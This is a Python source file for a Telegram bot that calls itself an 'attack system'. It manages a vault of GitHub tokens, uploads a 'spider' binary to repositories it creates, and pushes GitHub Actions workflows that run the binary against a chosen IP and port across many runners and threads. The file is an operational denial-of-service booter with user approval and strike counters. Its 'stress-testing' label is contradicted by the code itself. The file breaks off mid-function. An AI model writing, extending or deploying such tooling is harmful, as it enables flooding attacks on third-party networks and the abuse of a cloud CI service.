import os
import json
import logging
import time
import uuid
import asyncio
import random
import traceback
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
RUNNERS_PER_ATTACK = int(os.environ.get("RUNNERS_PER_ATTACK", "10"))
THREADS_PER_RUNNER = int(os.environ.get("THREADS_PER_RUNNER", "200"))
MAX_REPOS_PER_ATTACK = int(os.environ.get("MAX_REPOS_PER_ATTACK", "2"))
TOKEN_RATE_LIMIT_THRESHOLD = int(os.environ.get("TOKEN_RATE_LIMIT_THRESHOLD", "50"))

# ===== BINARY NAME (same as before) =====
BINARY_NAME = "spider"

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}
token_usage = {}

# ===== SAFE FILE OPS =====
def load_json(filename, default=None):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ===== INIT =====
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== TOKEN MANAGER =====
# ============================================================

class TokenManager:
    def __init__(self, tokens_list):
        self.tokens = tokens_list
        self.in_use = {}
        self.ratelimit_cache = {}
        self._last_rotation = 0
        self._rotation_index = 0

    def _validate_token(self, token):
        try:
            g = Github(token)
            user = g.get_user()
            _ = user.login
            rate = g.get_rate_limit()
            remaining = rate.core.remaining
            return True, remaining, user.login
        except:
            return False, 0, None

    def health_check(self):
        global github_tokens
        valid = []
        for td in github_tokens:
            token = td.get('token')
            if not token:
                continue
            ok, remaining, username = self._validate_token(token)
            if ok:
                td['username'] = username
                td['remaining'] = remaining
                valid.append(td)
            else:
                logger.warning(f"Removed dead token: {token[:10]}...")
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        self.in_use = {td['token']: 0 for td in github_tokens}
        self.ratelimit_cache = {td['token']: td.get('remaining', 1000) for td in github_tokens}
        return len(valid)

    def get_attack_tokens(self, max_count, exclude=[]):
        healthy = []
        candidates = [td for td in github_tokens if td['token'] not in exclude]
        candidates.sort(key=lambda x: (
            -x.get('remaining', 0),
            self.in_use.get(x['token'], 0)
        ))
        for td in candidates:
            token = td['token']
            if token in exclude:
                continue
            remaining = td.get('remaining', 0)
            if remaining < 50:
                logger.info(f"Token @{td['username']} low ({remaining}) - skipping")
                continue
            if self.in_use.get(token, 0) > 0:
                continue
            healthy.append(td)
            if len(healthy) >= max_count:
                break
        return healthy[:max_count]

    def mark_used(self, token):
        self.in_use[token] = self.in_use.get(token, 0) + 1
        for td in github_tokens:
            if td['token'] == token:
                td['remaining'] = td.get('remaining', 1000) - 100
                break

    def mark_released(self, token):
        if token in self.in_use:
            self.in_use[token] = max(0, self.in_use[token] - 1)

    def force_rotate(self):
        current = time.time()
        if current - self._last_rotation > 300:
            self._last_rotation = current
            self._rotation_index = (self._rotation_index + 1) % max(1, len(github_tokens))
            for token in list(self.in_use.keys()):
                self.in_use[token] = 0
            logger.info("Token rotation complete - all tokens released")
            return True
        return False

token_manager = TokenManager(github_tokens)

# ============================================================
# ===== VALIDATION & HELPERS =====
# ============================================================

def validate_github_token(token):
    try:
        if not token or len(token) < 20:
            return False, "Token too short"
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted"
        return True, user.login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)"
        elif e.status == 403:
            return False, "Rate limited (403)"
        elif e.status == 404:
            return False, "Token has no permissions (404)"
        else:
            return False, f"GitHub error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:40]}"

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ===== ATTACK MANAGEMENT =====
def start_attack(attack_id, targets, user_id):
    active_attacks[attack_id] = {
        "targets": targets,
        "user_id": user_id,
        "start_time": time.time(),
        "timer_task": None
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        for t in active_attacks[attack_id].get("targets", []):
            token_manager.mark_released(t['token'])
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== BINARY UPLOAD =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>\nOnly admins can deploy binaries.", parse_mode='HTML')
            return ConversationHandler.END
        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("<b>TOKEN VAULT EMPTY</b>\nAdd tokens via /addtoken", parse_mode='HTML')
            return ConversationHandler.END
        await update.message.reply_text(
            "<b>BINARY DEPLOYMENT</b>\n"
            "========================\n\n"
            f"<b>Send the</b> <code>spider</code> <b>binary file.</b>\n"
            f"<b>File name must be exactly:</b> <code>spider</code>\n\n"
            "<b>Type /cancel to abort.</b>",
            parse_mode='HTML'
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return ConversationHandler.END
        if not update.message.document:
            await update.message.reply_text("<b>Please send a file.</b>", parse_mode='HTML')
            return WAITING_FOR_BINARY
        file = update.message.document
        if file.file_name != BINARY_NAME:
            await update.message.reply_text(
                f"<b>File must be named</b> <code>{BINARY_NAME}</code><b>.</b>\n"
                f"<b>Found:</b> <code>{file.file_name}</code>",
                parse_mode='HTML'
            )
            return WAITING_FOR_BINARY
        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("<b>No valid tokens. Add with /addtoken</b>", parse_mode='HTML')
            return ConversationHandler.END

        progress = await update.message.reply_text("<b>Uploading to all repositories...</b>", parse_mode='HTML')
        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)

        success_count = 0
        fail_count = 0
        results = []
        for token_data in github_tokens:
            token = token_data.get('token')
            repo_name = token_data.get('repo')
            username = token_data.get('username', 'unknown')
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    existing = repo.get_contents(BINARY_NAME)
                    repo.update_file(BINARY_NAME, f"Update {BINARY_NAME} binary", content, existing.sha)
                    results.append((username, True, "Updated"))
                except Exception:
                    repo.create_file(BINARY_NAME, f"Add {BINARY_NAME} binary", content)
                    results.append((username, True, "Created"))
                success_count += 1
            except Exception as e:
                results.append((username, False, f"{str(e)[:40]}"))
                fail_count += 1

        msg = "<b>BINARY DEPLOYMENT COMPLETE</b>\n"
        msg += "============================\n\n"
        msg += f"<b>Success:</b> {success_count}\n"
        msg += f"<b>Failed :</b> {fail_count}\n"
        msg += f"<b>Total  :</b> {len(github_tokens)}\n\n"
        for username, success, status in results:
            mark = "<b>[OK]</b>" if success else "<b>[FAIL]</b>"
            msg += f"{mark} <b>@{username}:</b> {status}\n"
        await progress.edit_text(msg, parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"<b>Upload error:</b> {str(e)[:100]}", parse_mode='HTML')
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("<b>CANCELLED</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================================================
# ===== TOKEN COMMANDS =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>\nOnly admins can inject tokens.", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("<b>USAGE:</b> <code>/addtoken &lt;github_token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0].strip()
        is_valid, info = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"<b>INVALID TOKEN</b>\n{info}", parse_mode='HTML')
            return
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("<b>Token already exists in vault.</b>", parse_mode='HTML')
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(
                    f"<b>User @{username} already has a token.</b>\n"
                    f"<b>Existing repo:</b> <code>{t.get('repo')}</code>\n"
                    f"<b>Remove it first with /removetoken.</b>",
                    parse_mode='HTML'
                )
                return
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False)
        try:
            repo.create_file(".github/workflows/main.yml", "Init workflow", "")
        except:
            pass
        new_entry = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat()
        }
        github_tokens.append(new_entry)
        save_json('github_tokens.json', github_tokens)
        token_manager.health_check()
        await update.message.reply_text(
            "<b>TOKEN INJECTED</b>\n"
            "=================\n\n"
            f"<b>User  :</b> @{username}\n"
            f"<b>Repo  :</b> <code>{repo_name}</code>\n"
            f"<b>Vault :</b> {len(github_tokens)}",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:200]}", parse_mode='HTML')

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        removed = token_manager.health_check()
        if not github_tokens:
            msg = "<b>TOKEN VAULT EMPTY</b>"
            if removed > 0:
                msg = f"<b>Removed {removed} expired tokens.</b>\n<b>Vault is now empty.</b>"
            await update.message.reply_text(msg, parse_mode='HTML')
            return
        msg = "<b>TOKEN VAULT</b>\n"
        msg += "=============\n\n"
        if removed > 0:
            msg += f"<b>Removed {removed} expired tokens.</b>\n\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "..." + t['token'][-4:]
            remaining = t.get('remaining', '?')
            msg += f"<b>{i}. @{t.get('username', 'Unknown')}</b>\n"
            msg += f"   <b>Token:</b> <code>{token_short}</code>\n"
            msg += f"   <b>Remaining:</b> {remaining}\n"
            msg += f"   <b>Repo:</b> <code>{t['repo']}</code>\n\n"
        msg += f"<b>Total valid:</b> {len(github_tokens)}"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("<b>No tokens to check.</b>", parse_mode='HTML')
            return
        removed = token_manager.health_check()
        msg = "<b>TOKEN HEALTH CHECK</b>\n"
        msg += "===================\n\n"
        msg += f"<b>Total          :</b> {len(github_tokens)}\n"
        msg += f"<b>Expired removed:</b> {removed}\n\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "..." + t['token'][-4:]
            remaining = t.get('remaining', 'N/A')
            if remaining > TOKEN_RATE_LIMIT_THRESHOLD:
                status = "<b>[GOOD]</b>"
            elif remaining > 10:
                status = "<b>[LOW ]</b>"
            else:
                status = "<b>[CRIT]</b>"
            msg += f"{status} <b>@{t.get('username', 'Unknown')}</b>\n"
            msg += f"   <b>Token:</b> <code>{token_short}</code>\n"
            msg += f"   <b>Remaining:</b> {remaining}\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("<b>USAGE:</b> <code>/removetoken &lt;token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0]
        found = False
        for i, t in enumerate(github_tokens):
            if t.get('token') == token:
                github_tokens.pop(i)
                save_json('github_tokens.json', github_tokens)
                token_manager.health_check()
                found = True
                break
        if found:
            await update.message.reply_text(f"<b>Token removed. Remaining:</b> {len(github_tokens)}", parse_mode='HTML')
        else:
            await update.message.reply_text("<b>Token not found.</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("<b>Vault already empty.</b>", parse_mode='HTML')
            return
        count = len(github_tokens)
        if len(context.args) == 1 and context.args[0].lower() == "confirm":
            github_tokens.clear()
            save_json('github_tokens.json', github_tokens)
            token_manager.health_check()
            await update.message.reply_text(f"<b>Cleared {count} tokens.</b>", parse_mode='HTML')
        else:
            await update.message.reply_text(
                f"<b>Delete ALL {count} tokens?</b>\n"
                f"<b>Use:</b> <code>/cleartokens confirm</code>",
                parse_mode='HTML'
            )
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== ROTATE COMMAND =====
# ============================================================

async def rotatetokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        token_manager.force_rotate()
        token_manager.health_check()
        active_count = sum(1 for t in github_tokens if token_manager.in_use.get(t['token'], 0) > 0)
        await update.message.reply_text(
            "<b>TOKEN ROTATION COMPLETE</b>\n"
            "==========================\n\n"
            f"<b>Total tokens :</b> {len(github_tokens)}\n"
            f"<b>Active       :</b> {active_count}\n"
            f"<b>All tokens released for new attacks.</b>",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== ATTACK COMMAND =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>\nYou don't have permission to launch strikes.", parse_mode='HTML')
            return
        if len(context.args) != 3:
            await update.message.reply_text(
                "<b>USAGE:</b> <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n\n"
                "<b>Example:</b> <code>/attack 1.1.1.1 443 60</code>\n"
                "<b>Time range:</b> 5 - 3600 seconds\n"
                f"<b>Max repositories per attack:</b> {MAX_REPOS_PER_ATTACK}",
                parse_mode='HTML'
            )
            return

        ip, port_str, time_str = context.args
        try:
            port = int(port_str)
            time_val = int(time_str)
        except:
            await update.message.reply_text("<b>INVALID INPUT</b>\nPort and time must be numbers.", parse_mode='HTML')
            return
        if not (1 <= port <= 65535):
            await update.message.reply_text("<b>INVALID PORT</b>\nMust be between 1 and 65535.", parse_mode='HTML')
            return
        if time_val < 5 or time_val > 3600:
            await update.message.reply_text("<b>INVALID DURATION</b>\nMust be 5-3600 seconds.", parse_mode='HTML')
            return

        token_manager.health_check()
        token_manager.force_rotate()

        if not github_tokens:
            await update.message.reply_text("<b>No tokens. Add with /addtoken</b>", parse_mode='HTML')
            return

        max_tokens = MAX_REPOS_PER_ATTACK
        healthy_tokens = token_manager.get_attack_tokens(max_tokens)

        if not healthy_tokens:
            await update.message.reply_text(
                "<b>NO HEALTHY TOKENS AVAILABLE</b>\n\n"
                "<b>Wait for rate limit reset or add more tokens.</b>\n"
                f"<b>Vault:</b> {len(github_tokens)} tokens\n"
                "<b>Use /checktokens to see status.</b>",
                parse_mode='HTML'
            )
            return

        attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
        deployed = []
        failed = []

        for token_data in healthy_tokens:
            token = token_data['token']
            repo_name = token_data['repo']
            username = token_data['username']
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)

                try:
                    repo.get_contents(BINARY_NAME)
                except:
                    failed.append((username, f"Binary missing - upload via /binary_upload"))
                    continue

                actual_runners = min(RUNNERS_PER_ATTACK, 15)
                yml_content = f"""name: attack
on: push
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [{','.join([str(i) for i in range(1, actual_runners+1)])}]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x {BINARY_NAME}
    - run: sudo ./{BINARY_NAME} {ip} {port} {time_val} {THREADS_PER_RUNNER}
"""
                try:
                    file = repo.get_contents(YML_FILE_PATH)
                    repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
                except:
                    try:
                        repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
                    except:
                        repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml_content)

                deployed.append({
                    "username": username,
                    "repo": repo_name,
                    "token": token,
                    "actions_url": f"https://github.com/{repo_name}/actions"
                })
                token_manager.mark_used(token)
                logger.info(f"Deployed to {repo_name}")

            except Exception as e:
                failed.append((username, str(e)[:40]))
                logger.error(f"Failed {repo_name}: {e}")

        if not deployed:
            await update.message.reply_text(
                f"<b>DEPLOYMENT FAILED</b>\n\n<b>Errors:</b> {failed[:3]}",
                parse_mode='HTML'
            )
            return

        start_attack(attack_id, deployed, user_id)
        active_attacks[attack_id]["duration"] = time_val

        async def auto_finish():
            await asyncio.sleep(time_val + 10)
            finish_attack(attack_id)
            logger.info(f"Auto-finished {attack_id}")
        timer_task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = timer_task

        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        finish_time = (datetime.now() + timedelta(seconds=time_val)).strftime("%Y-%m-%d %H:%M:%S")
        total_threads = len(deployed) * min(RUNNERS_PER_ATTACK, 15) * THREADS_PER_RUNNER

        if time_val <= 60:
            threat = "<b>MODERATE</b>"
        elif time_val <= 300:
            threat = "<b>HIGH</b>"
        else:
            threat = "<b>CRITICAL</b>"

        message = (
            "<b>ATTACK DEPLOYED</b>\n"
            "===============\n\n"
            f"<b>Target        :</b> {ip}:{port}\n"
            f"<b>Duration      :</b> {time_val}s\n"
            f"<b>Repositories  :</b> {len(deployed)} (max {MAX_REPOS_PER_ATTACK})\n"
            f"<b>Runners/Repo  :</b> {min(RUNNERS_PER_ATTACK, 15)} x {THREADS_PER_RUNNER} threads\n"
            f"<b>Total Threads :</b> {total_threads}\n"
            f"<b>Strike ID     :</b> <code>{attack_id}</code>\n"
            f"<b>Launched At   :</b> {start_time}\n"
            f"<b>ETA           :</b> {finish_time}\n"
            f"<b>Threat Level  :</b> {threat}\n\n"
            "<b>LIVE FEEDS</b>\n"
            "-----------\n"
        )
        for d in deployed:
            message += f"<b>- @{d['username']}</b>  <code>{d['repo']}</code>\n"
        message += (
            f"\n<b>Abort:</b> /stop\n"
            f"<b>Strike #{attack_counters.get(str(user_id), 0)} launched across {len(deployed)} repos.</b>"
        )
        await update.message.reply_text(message, parse_mode='HTML', disable_web_page_preview=True)

    except Exception as e:
        await update.message.reply_text(f"<b>DEPLOYMENT FAILED</b>\n<code>{str(e)[:200]}</code>", parse_mode='HTML')

# ============================================================
# ===== STATUS COMMAND =====
# ============================================================

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return

        if not active_attacks:
            await update.message.reply_text(
                "<b>SYSTEM STATUS - IDLE</b>\n"
                "====================\n\n"
                "<b>Status        :</b> READY\n"
                "<b>Active Raids  :</b> 0\n"
                "<b>Firepower     :</b> 0 Threads\n\n"
                "<b>No active strikes. Deploy one with /attack</b>",
                parse_mode='HTML'
            )
            return

        total_threads = 0
        msg = "<b>LIVE FEED - ACTIVE RAIDS</b>\n"
        msg += "========================\n\n"
        for aid, data in active_attacks.items():
            targets = data.get("targets", [])
            total_threads += len(targets) * min(RUNNERS_PER_ATTACK, 15) * THREADS_PER_RUNNER
            elapsed = int(time.time() - data['start_time'])
            duration = data.get('duration', 60)
            remaining = max(0, duration - elapsed)
            progress = int((elapsed / duration) * 10) if duration > 0 else 0
            progress = min(progress, 10)
            bar = "#" * progress + "." * (10 - progress)
            if targets:
                msg += f"<b>Target    :</b> {targets[0].get('ip', '?')}:{targets[0].get('port', '?')}\n"
                msg += f"<b>Progress  :</b> <code>[{bar}]  {elapsed}s / {duration}s  (Rem: {remaining}s)</code>\n"
                msg += f"<b>Repos     :</b> {len(targets)}\n"
                msg += "------------------------------\n"
        msg += f"\n<b>Total Firepower :</b> {total_threads} Threads\n"
        msg += "<b>Use /stop to abort all missions.</b>"
        await update.message.reply_text(msg, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== OTHER COMMANDS =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        total_attacks = sum(attack_counters.values())
        user_attacks = attack_counters.get(str(user_id), 0)

        if can_attack(user_id):
            keyboard = [
                [InlineKeyboardButton("Launch Strike", callback_data="attack_help")],
                [InlineKeyboardButton("Live Feed", callback_data="status")],
                [InlineKeyboardButton("Abort Mission", callback_data="stop")],
            ]
            if is_owner(user_id):
                keyboard.append([InlineKeyboardButton("Admin Console", callback_data="admin_panel")])

            role = "OWNER" if is_owner(user_id) else "APPROVED"
            await update.message.reply_text(
                "<b>ARMADA - ATTACK SYSTEM</b>\n"
                "======================\n\n"
                f"<b>Operator      :</b> @{username}\n"
                f"<b>Role          :</b> {role}\n"
                f"<b>Workers/Repo  :</b> {min(RUNNERS_PER_ATTACK, 15)}\n"
                f"<b>Threads/Worker:</b> {THREADS_PER_RUNNER}\n"
                f"<b>Repos/Attack  :</b> {MAX_REPOS_PER_ATTACK}\n"
                f"<b>Total Load    :</b> {min(RUNNERS_PER_ATTACK, 15) * THREADS_PER_RUNNER * MAX_REPOS_PER_ATTACK} Threads\n"
                f"<b>Status        :</b> ONLINE\n"
                f"<b>Your Strikes  :</b> {user_attacks}\n"
                f"<b>Total Raids   :</b> {total_attacks}\n\n"
                "<b>Quick Deploy:</b> <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
                "<b>Type /help for all commands.</b>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
                pending_users.append({"user_id": user_id, "username": username, "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                save_json('pending_users.json', pending_users)
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            int(owner_id),
                            "<b>ACCESS REQUEST</b>\n"
                            "==============\n\n"
                            f"<b>Username:</b> @{username}\n"
                            f"<b>User ID :</b> <code>{user_id}</code>\n"
                            f"<b>Use:</b> <code>/approve {user_id} 7</code>",
                            parse_mode='HTML'
                        )
                    except:
                        pass
            await update.message.reply_text(
                "<b>ACCESS DENIED</b>\n"
                "=============\n\n"
                "<b>Your request has been submitted to the system admin.</b>\n"
                "<b>Please wait for approval.</b>",
                parse_mode='HTML'
            )
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if not active_attacks:
            await update.message.reply_text("<b>No active raids to abort.</b>", parse_mode='HTML')
            return
        count = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        await update.message.reply_text(
            "<b>ABORT MISSION</b>\n"
            "=============\n\n"
            f"<b>Terminated {count} raid(s).</b>\n"
            "<b>System is now idle.</b>",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>COMMAND REFERENCE</b>\n"
        "=================\n\n"
        "<b>STRIKE COMMANDS</b>\n"
        "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>  - Launch multi-repo strike\n"
        "<code>/status</code>                     - View live raid feed\n"
        "<code>/stop</code>                       - Emergency abort all raids\n\n"
        "<b>ADMIN PANEL</b>\n"
        "<code>/addtoken &lt;token&gt;</code>           - Inject a GitHub token\n"
        "<code>/removetoken &lt;token&gt;</code>        - Remove a token\n"
        "<code>/checktokens</code>                - Health check with rate-limit info\n"
        "<code>/cleartokens confirm</code>        - Wipe the vault\n"
        "<code>/tokens</code>                     - List all tokens\n"
        "<code>/rotate</code>                     - Release all tokens for new attacks\n"
        "<code>/binary_upload</code>              - Deploy the spider binary\n"
        "<code>/approve &lt;id&gt; &lt;days&gt;</code>        - Grant access\n"
        "<code>/remove &lt;id&gt;</code>                - Revoke access\n"
        "<code>/users</code>                      - List approved users\n"
        "<code>/pending</code>                    - Pending requests\n"
        "<code>/broadcast &lt;msg&gt;</code>            - Send announcement\n\n"
        "<b>UTILITY</b>\n"
        "<code>/start</code>    - Main dashboard\n"
        "<code>/myid</code>     - Your Telegram ID\n"
        "<code>/about</code>    - Bot info\n"
        "<code>/help</code>     - This menu",
        parse_mode='HTML'
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>YOUR TELEGRAM ID</b>\n"
        "================\n\n"
        f"<code>{update.effective_user.id}</code>\n\n"
        "<b>Keep this safe - it's your access key.</b>",
        parse_mode='HTML'
    )

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>ARMADA - ATTACK SYSTEM</b>\n"
        "======================\n\n"
        "<b>Version       :</b> 3.0\n"
        "<b>Built with    :</b> Python, python-telegram-bot, GitHub Actions\n"
        "<b>Architecture  :</b> Multi-repo, Multi-runner, Token-aware\n"
        f"<b>Max repos     :</b> {MAX_REPOS_PER_ATTACK}\n"
        f"<b>Runners/repo  :</b> {min(RUNNERS_PER_ATTACK, 15)} x {THREADS_PER_RUNNER} threads\n"
        f"<b>Binary name   :</b> <code>{BINARY_NAME}</code>\n\n"
        "<b>Purpose: Stress-testing & network resilience</b>\n\n"
        "<b>Use /help to see all commands.</b>",
        parse_mode='HTML'
    )

# ============================================================
# ===== ADMIN USER COMMANDS =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if len(context.args) != 2:
            await update.message.reply_text("<b>USAGE:</b> <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": user_id, "expiry": expiry, "days": days}
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"<b>User {target_id} approved for {days} days.</b>", parse_mode='HTML')
        try:
            await context.bot.send_message(target_id, "<b>ACCESS GRANTED</b>\n\n<b>Use /start to launch your first strike.</b>", parse_mode='HTML')
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
